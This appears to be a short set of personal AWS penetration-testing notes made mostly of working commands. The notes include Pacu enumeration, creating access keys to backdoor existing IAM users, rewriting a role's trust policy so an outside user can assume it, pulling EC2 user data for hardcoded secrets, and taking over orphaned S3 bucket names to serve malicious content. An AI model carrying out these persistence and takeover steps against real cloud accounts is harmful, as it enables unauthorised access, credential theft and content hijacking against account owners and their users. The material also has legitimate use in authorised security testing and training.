## General
### Access key and Secret key:
```
aws configure
aws configure --profile Test
aws sts get-caller-identity --profile Test
```

### PACU
```
import_keys Test
ls
whoami
run iam__enum_permissions
run aws__enum_spend
```

## Maintain persistence
Identify user with 0 or 1 access key (need iam:CreateAccessKey)
```
aws iam list-users --profile Test
aws iam list-access-keys --user-name Sarah --profile Test
aws iam create-access-key --user-name Sarah --profile Test
# Or run PACU command
run iam__backdoor_users_keys
```

User with iam update-assume-role-policy
Identify non-service-link role
```
aws iam a list-roles --profile Test
```
Change the trust-policy
```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com",
        "AWS": "arn:aws:iam::593820606366:user/vitquay-nonroot"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```
Update and assume role
```
aws iam update-assume-role-policy --role-name test-role --policy-document file://trust-policy.json --profile Test
aws sts assume-role --role-arn arn:aws:iam::748384263101:role/test-role --role-session-name PersistenceTest --profile vitquaynonroot
```

## EC2
10.0.1.1 is reserved for the gateway of the subnet, 10.0.1.2 is
reserved for AWS DNS, and 10.0.1.3 is reserved for any future use by
AWS.

Look for hardcoded user data
```
run ec2__enum
run ec2__download_userdata
```
## S3
### awscli commands
```
aws s3 ls s3://kirit-bucket
aws s3 cp abc.txt s3://kirit-bucket/new/abc.txt
aws s3 rm s3://kirit-bucket/new/abc.txt --acl public-read
```

### NoSuchBucket message
- Check CNAME record for the bucket name
- Create S3 bucket with the same name and region
- Deploy malicious content

## Lambda
